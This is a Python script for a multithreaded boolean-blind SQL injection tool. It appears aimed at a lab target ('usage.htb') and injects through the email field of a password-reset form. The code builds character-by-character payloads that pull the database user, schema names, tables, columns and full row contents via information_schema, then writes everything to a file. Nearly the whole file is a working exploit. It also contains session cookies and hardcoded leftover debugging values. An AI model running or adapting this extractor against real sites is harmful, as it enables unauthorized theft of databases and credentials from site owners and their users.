#!/usr/bin/python3

import requests
import signal
import sys
import time
import os
import re
import math
import copy
import concurrent.futures
from abc import ABC, abstractmethod
from pwn import log

import utils
import structs


# Ctrl + c
def ctrlC(sig, frame):
    print(
        f"\n\n[{utils.Color.RED}x{utils.Color.END}] {utils.Color.BOLD}Saliendo...{utils.Color.END}\n"
    )
    sys.exit(1)


signal.signal(signal.SIGINT, ctrlC)

# Global variables
stop_threads = True
character_finded = 0


# Strategies Classes
class Payload(ABC):

    @abstractmethod
    def build_payload(
        self,
        exploit: str,
        position: int,
        character: int,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> str:
        """Build the payload to be used in dependency on what you want to extract from the database"""
        pass


class ConditionalPayload(Payload):

    def build_payload(
        self,
        exploit: str,
        position: int,
        character: int,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> str:

        result = ""

        if exploit == "User":
            result = (
                f"' and (select ascii(substring(user(),{position},1)))='{character}"
            )
        elif exploit == "DBs":
            result = f"' and (select ascii(substring(group_concat(schema_name),{position},1)) from information_schema.schemata)='{character}"
        elif exploit == "Tables" and db is not None:
            result = f"' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
        elif exploit == "Columns" and db is not None and table is not None:
            result = f"' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
        elif exploit == "Rows" and db is not None and table is not None:
            columns = table.concat_columns()
            result = f"' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"

        return result


class Condition(ABC):

    def __init__(self, value: str):
        self._value = value

    def __str__(self) -> str:
        return self._value

    @abstractmethod
    def get_condition(self, response: requests.Response) -> bool:
        pass


class TextInCondition(Condition):

    def get_condition(self, response: requests.Response) -> bool:
        result = False

        if self._value in response.content.decode():
            result = True

        return result


class StatusEqualCondition(Condition):

    def get_condition(self, response: requests.Response) -> bool:
        result = False

        if self._value == str(response.status_code):
            result = True

        return result


class RequestType(ABC):
    _characters = (
        list(range(97, 123))
        + [95, 44, 64, 45]
        + list(range(48, 58))
        + list(range(33, 44))
        + [46, 47]
        + list(range(58, 64))
        + list(range(65, 95))
        + [96]
        + list(range(123, 127))
    )

    @abstractmethod
    def build_request(
        self,
        data,
        atribute_to_exploit: str,
        payload: Payload,
        main_url: str,
        headers: dict,
        info_name: str,
        position: int,
        condition: Condition,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> list:
        """Build the data for the request"""
        pass

    @abstractmethod
    def send_request(
        self,
        requests_data: structs.WrapperRequest,
    ) -> int | None:
        """Send the request that contain the payload"""
        pass


class PostRequest(RequestType):

    def __str__(self) -> str:
        return "POST"

    def build_request(
        self,
        data: dict,
        atribute_to_exploit: str,
        payload: Payload,
        main_url: str,
        headers: dict,
        info_name: str,
        position: int,
        condition: Condition,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> list:

        result = []

        for character in self._characters:
            concat_payload = f"{data[atribute_to_exploit]}{payload.build_payload(info_name,position,character, db, table)}"
            copy_data = data.copy()
            copy_data[atribute_to_exploit] = concat_payload
            result.append(
                structs.WrapperRequest(
                    copy_data, character, main_url, headers, condition
                )
            )

        return result

    def send_request(
        self,
        requests_data: structs.WrapperRequest,
    ) -> int | None:
        global stop_threads
        global character_finded

        if stop_threads:
            return None

        response = requests.post(
            requests_data.main_url,
            headers=requests_data.headers,
            data=requests_data.data,
        )

        if requests_data.condition.get_condition(response):
            character_finded = requests_data.character
            stop_threads = True

        return requests_data.character


class GetRequest(RequestType):

    def __str__(self) -> str:
        return "GET"

    def build_request(
        self,
        data: str,
        atribute_to_exploit: str,
        payload: Payload,
        main_url: str,
        headers: dict,
        info_name: str,
        position: int,
        condition: Condition,
        db: structs.DB | None,
        table: structs.Table | None,
    ) -> list:

        result = []

        for character in self._characters:
            result.append(
                structs.WrapperRequest(
                    f"{main_url}{data}{payload.build_payload(info_name,position,character, db, table)}",
                    character,
                    main_url,
                    headers,
                    condition,
                )
            )

        return result

    def send_request(
        self,
        requests_data: structs.WrapperRequest,
    ) -> int | None:
        global stop_threads
        global character_finded

        if stop_threads:
            return None

        response = requests.get(str(requests_data.data), headers=requests_data.headers)

        if requests_data.condition.get_condition(response):
            character_finded = requests_data.character
            stop_threads = True

        return requests_data.character


# Main Class
class Extractor:

    def __init__(
        self,
        main_url: str,
        headers: dict,
        data: str | dict,
        method: RequestType,
        condition: Condition,
        payload: Payload,
        num_threads: int = 1,
        atribute_to_exploit: str = "",
    ):
        self.main_url = main_url
        self.method = method
        self.headers = headers
        self.condition = condition
        self.payload = payload
        self.num_threads = num_threads
        self.data = data
        self.atribute_to_exploit = atribute_to_exploit
        self._dbs: list = []

    @staticmethod
    def init_with_interface(
        label_url,
        label_method,
        label_headers,
        label_data,
        label_exploit,
        label_condition,
        label_threads,
    ):
        """Alternative constructor, initializes the attributes with an interactive interface"""

        main_url = ""
        method = None
        headers = {}
        data: str | dict = {}
        atribute_to_exploit = ""
        condition = ""
        payload = ConditionalPayload()
        num_threads = 1

        def get_input_rows(answer_size: int, text: str) -> int:
            """Determ the amount of lines of the user input"""

            size = os.get_terminal_size()
            match = re.search(r"columns=(\d+)", str(size))
            columns = int(match.group(1))

            return math.ceil((answer_size + len(text)) / columns)

        print("\n\n")

        while True:
            input_url = input(
                f"[{utils.Color.BLUE}?{utils.Color.END}] Request URL with https/http: "
            )

            if input_url and ("http://" in input_url or "https://" in input_url):
                main_url = input_url
                label_url.status(input_url)
                print("\033[A\033[J" * get_input_rows(33, input_url), end="")
                break
            else:
                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")

        while True:
            input_method = input(
                f"[{utils.Color.BLUE}?{utils.Color.END}] Request Method, GET/POST: "
            )

            if input_method and (input_method == "POST" or input_method == "GET"):
                if input_method == "POST":
                    method = PostRequest()
                else:
                    method = GetRequest()
                label_method.status(input_method)
                print("\033[A\033[J", end="")
                break
            else:
                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")

        follow_condition = input(
            f"[{utils.Color.BLUE}?{utils.Color.END}] Would you like to add headers to the request? y/n: "
        )
        print("\033[A\033[J", end="")

        if follow_condition == "y":
            while True:
                input_header = input(
                    f"[{utils.Color.BLUE}?{utils.Color.END}] Request Headers, use the following format <name>:<value> "
                )

                if input_header:
                    name, value = input_header.split(":")
                    headers[name] = value
                    label_headers.status(headers)
                    print("\033[A\033[J" * get_input_rows(61, input_header), end="")

                    follow_condition = input(
                        f"[{utils.Color.BLUE}?{utils.Color.END}] Would you like to add another header? y/n: "
                    )
                    print("\033[A\033[J", end="")

                    if follow_condition == "n":
                        break
                else:
                    print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                    print("\033[A\033[J" * 2, end="")
                    time.sleep(1)

        while True:
            input_data = input(
                f"[{utils.Color.BLUE}?{utils.Color.END}] Values with which the request is correct, in Post Request use the following format <name>:<value> "
            )

            if input_data:
                if method == "POST":
                    name, value = input_data.split(":")
                    data[name] = value
                    label_data.status(data)
                    print("\033[A\033[J" * get_input_rows(112, input_data), end="")

                    follow_condition = input(
                        f"[{utils.Color.BLUE}?{utils.Color.END}] Would you like to add another value? y/n: "
                    )
                    print("\033[A\033[J", end="")

                    if follow_condition == "n":
                        break

                else:
                    data = input_data
                    label_data.status(data)
                    print("\033[A\033[J", end="")
                    break

            else:
                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                print("\033[A\033[J" * 2, end="")
                time.sleep(1)

        if method == "POST":
            while True:
                input_exploit = input(
                    f"[{utils.Color.BLUE}?{utils.Color.END}] Name of the value that we want to exploit: "
                )

                if input_exploit:
                    atribute_to_exploit = input_exploit
                    label_exploit.status(input_exploit)
                    print("\033[A\033[J" * get_input_rows(47, input_data), end="")
                    break
                else:
                    print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                    time.sleep(1)
                    print("\033[A\033[J" * 2, end="")

        while True:
            input_condition = input(
                f"[{utils.Color.BLUE}?{utils.Color.END}] Text in the response by which we can detect that the result was correct: "
            )

            if input_condition:
                condition = TextInCondition("input_condition")
                label_condition.status(input_condition)
                print("\033[A\033[J" * get_input_rows(77, input_data), end="")
                break
            else:
                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")

        pc_threads = os.cpu_count() or 1
        if pc_threads != 1:
            try:
                input_threads = input(
                    f"[{utils.Color.BLUE}?{utils.Color.END}] Number of threads 1-{pc_threads}: "
                )
                print("\033[A\033[J", end="")
                if (
                    int(input_threads) in range(pc_threads + 1)
                    and int(input_threads) != 0
                ):
                    num_threads = int(input_threads)
            except ValueError:
                print(f"[{utils.Color.RED}x{utils.Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")
        label_threads.status(num_threads)

        return Extractor(
            main_url,
            headers,
            data,
            method,
            condition,
            payload,
            num_threads,
            atribute_to_exploit,
        )

    def _select_color(self, info_name: str) -> str:
        """Determines the color that is used to display different values of the DB"""

        switcher = {
            "User": utils.Color.UNDERLINE,
            "DBs": utils.Color.PURPLE,
            "Tables": utils.Color.CYAN,
            "Columns": utils.Color.BLUE,
            "Rows": utils.Color.BLUE,
        }

        return switcher.get(info_name, utils.Color.BLUE)

    def _get_info(
        self,
        label_info,
        label_menu,
        info_name: str,
        db: structs.DB | None = None,
        table: structs.Table | None = None,
    ) -> str:
        """Use Multithreads, build the payload and data to send the request"""

        global stop_threads

        stop_threads = True
        info = "admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_"
        position = 60

        while stop_threads:
            stop_threads = False

            requests_data = self.method.build_request(
                self.data,
                self.atribute_to_exploit,
                self.payload,
                self.main_url,
                self.headers,
                info_name,
                position,
                self.condition,
                db,
                table,
            )

            with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.num_threads
            ) as executor:
                futures = {
                    executor.submit(self.method.send_request, data)
                    for data in requests_data
                }
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()

                    label_menu.status(chr(result))

                    if stop_threads:
                        executor.shutdown(wait=False)
                        break

            if stop_threads:
                info += chr(character_finded)
                label_info.status(
                    f"{self._select_color(info_name)}{info}{utils.Color.END}"
                )

            position += 1

        return info

    def get_user(self, label_menu) -> None:
        """Get the username that is running the DB process"""

        label_info = log.progress(utils.Color.YELLOW + "User" + utils.Color.END)
        self._get_info(label_info, label_menu, "User")
        print("\n")

    def get_dbs(self, label_menu) -> None:
        """Get the names of the data bases"""

        label_info = log.progress(utils.Color.YELLOW + "DBs" + utils.Color.END)
        info = self._get_info(label_info, label_menu, "DBs")

        new_dbs = info.split(",")
        for db_name in new_dbs:
            db = structs.DB(db_name, [])
            self._dbs.append(db)

        print("\n")

    def get_tables(self, label_menu) -> None:
        """Get the name of the tables of each db"""

        for db in self._dbs:

            label_info = log.progress(
                f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Tables{utils.Color.END}"
            )
            info = self._get_info(label_info, label_menu, "Tables", db)

            new_tables = info.split(",")
            for table_name in new_tables:
                table = structs.Table(table_name, [], [])
                db.tables.append(table)

        print("\n")

    def get_columns(self, label_menu) -> None:
        """Get the name of the columns of each table"""

        for db in self._dbs:

            for table in db.tables:

                label_info = log.progress(
                    f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Table{utils.Color.END}:{utils.Color.CYAN}{table.name}{utils.Color.END} {utils.Color.YELLOW}Columns{utils.Color.END}"
                )
                info = self._get_info(label_info, label_menu, "Columns", db, table)

                new_columns = info.split(",")
                for column_name in new_columns:
                    table.columns.append(column_name)

        print("\n")

    def get_rows(self, label_menu) -> None:
        """Get the content of each table"""

        for db in self._dbs:

            for table in db.tables:

                label_info = log.progress(
                    f"{utils.Color.YELLOW}DB{utils.Color.END}:{utils.Color.PURPLE}{db.name}{utils.Color.END} {utils.Color.YELLOW}Table{utils.Color.END}:{utils.Color.CYAN}{table.name}{utils.Color.END} {utils.Color.YELLOW}Rows{utils.Color.END}"
                )

                info = self._get_info(label_info, label_menu, "Rows", db, table)

                new_rows = info.split(",")
                for row in new_rows:
                    table.rows.append(row)

        print("\n")

    def build_file(self) -> None:
        """Save all the data in a txt file"""

        with open("db.txt", "w") as f:
            for db in self._dbs:
                f.write("DB: " + db.name + "\n")
                for table in db.tables:
                    f.write("Table: " + table.name + "\n")
                    f.write("Colums: " + table.concat_columns() + "\n")
                    f.write("Rows: " + "\n")
                    for row in table.rows:
                        f.write(row + "\n")

                    f.write("\n\n")
                f.write("\n\n\n")

        print(
            f"\n\n[{utils.Color.YELLOW}!{utils.Color.END}] {utils.Color.BOLD}More details in db.txt{utils.Color.END}\n"
        )


def main():
    print(
        f"""
    {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}
    {utils.Color.BLUE}BBBBB   L      IIIII  N   N  DDDD {utils.Color.END}     {utils.Color.RED} SSS     QQQ    L      IIIII{utils.Color.END}      {utils.Color.BLUE}EEEEE  X   X  TTTTT  RRRR     A    CCCC  TTTTT   OOO   RRRR{utils.Color.END}
    {utils.Color.BLUE}B   B   L        I    NN  N  D   D{utils.Color.END}     {utils.Color.RED}S       Q   Q   L        I  {utils.Color.END}      {utils.Color.BLUE}E       X X     T    R   R   A A   C       T    O   O  R   R{utils.Color.END}
    {utils.Color.BLUE}BBBBB   L        I    N N N  D   D{utils.Color.END}     {utils.Color.RED} SSS    Q   Q   L        I  {utils.Color.END}      {utils.Color.BLUE}EEEE     X      T    RRRR   AAAAA  C       T    O   O  RRRR{utils.Color.END}
    {utils.Color.BLUE}B   B   L        I    N  NN  D   D{utils.Color.END}         {utils.Color.RED}S   Q  QQ   L        I  {utils.Color.END}      {utils.Color.BLUE}E       X X     T    R  R   A   A  C       T    O   O  R  R{utils.Color.END}
    {utils.Color.BLUE}BBBBB   LLLLL  IIIII  N   N  DDDD {utils.Color.END}     {utils.Color.RED}SSSS     QQ  Q  LLLLL  IIIII{utils.Color.END}      {utils.Color.BLUE}EEEEE  X   X    T    R   R  A   A  CCCC    T     OOO   R   R{utils.Color.END}
    {utils.Color.BOLD}#####################################################################################################################################{utils.Color.END}\n
    """
    )

    label_url = log.progress(f"{utils.Color.BOLD}Url{utils.Color.END}")
    label_method = log.progress(f"{utils.Color.BOLD}Method{utils.Color.END}")
    label_headers = log.progress(f"{utils.Color.BOLD}Headers{utils.Color.END}")
    label_data = log.progress(f"{utils.Color.BOLD}Data{utils.Color.END}")
    label_exploit = log.progress(f"{utils.Color.BOLD}Field to exploit{utils.Color.END}")
    label_condition = log.progress(f"{utils.Color.BOLD}Condition{utils.Color.END}")
    label_threads = log.progress(f"{utils.Color.BOLD}Threads{utils.Color.END}")

    # Initiate parameters specifying them
    main_url = "http://usage.htb/forget-password"
    headers = {
        "Cookie": "eyJpdiI6Ii8yQXF5SWtjSHhVdDBWVXFhSXBhbkE9PSIsInZhbHVlIjoiQlg5N045ZzFaNjZsbzhsdy9USlRmdVRzeXQ5WDErN3VONXBkYVpiLzFrSll1RVhXcmpkWVFvMmhBTlN2VzFMSnNrOU1XSkE3MzdteDdIdXV5Q2VXbjJMT3R4TXJ2SGd3OXlEb3E3VnFhRy9FUzJzeTlweWhLZXdITkQwZ3BySVciLCJtYWMiOiJlYWQ5ZGRhYWNkNWYxOGJjNjdiNDE0Y2RmNTBmY2QzZDgyYmFhM2NmNzE0MTcyN2VkZTZlYjMzNDFmMTVhYWQ4IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlBzSHdwQnhIZlIvR2lLZ21nbXM5R0E9PSIsInZhbHVlIjoicXZkY3lGN2lHaW1ZY2JaTU9KTVRpTnU1SGh6NUdua3FJb3FZa1A3MmI2Q0F3MWRNOFJJYTM4ZVJ0dEdSVXlCNGZSUzFRbGJ3cGswelBUb2lZV05IT2xEa3d6enFCOWxIVC9peFhTbEYzMkpJQVdjTTVLNUFsSllFcEdrT09ucHgiLCJtYWMiOiI4NGQ4MTNjNjc2ODQ3ZjMzMTUyYWJmNGUyMDJkMzc1NmU4NTMxNTA3NTEyYjdiNDYyNzYyNzQ0ZjFlNGJiNjg0IiwidGFnIjoiIn0%3D"
    }
    data = {
        "_token": "iCzjG2KwyBsD76adgj4eSaipnT4qyMod5KikpF49",
        "email": "test@gmail.com",
    }
    method = PostRequest()
    condition = TextInCondition("We have e-mailed your password reset link to ")
    payload = ConditionalPayload()
    num_threads = 1
    atribute_to_exploit = "email"

    label_url.status(main_url)
    label_method.status(method.__str__())
    label_headers.status(headers)
    label_data.status(data)
    label_exploit.status(atribute_to_exploit)
    label_condition.status(condition.__str__())
    label_threads.status(num_threads)

    instance = Extractor(
        main_url,
        headers,
        data,
        method,
        condition,
        payload,
        num_threads,
        atribute_to_exploit,
    )

    # Initiate parameters with interface
    # instance = Extractor.init_with_interface(label_url, label_method, label_headers, label_data, label_exploit,label_condition,label_threads)

    print("\n")
    label_menu = log.progress(utils.Color.RED + "Brute Force" + utils.Color.END)
    label_menu.status(" Starting ...")
    print("\n")
    time.sleep(1)

    instance._dbs.append(structs.DB("usage_blog", []))

    # instance.get_user(label_menu)
    # instance.get_dbs(label_menu)
    instance.get_tables(label_menu)
    # instance.get_columns(label_menu)
    # instance.get_rows(label_menu)
    # instance.build_file()


if __name__ == "__main__":
    main()
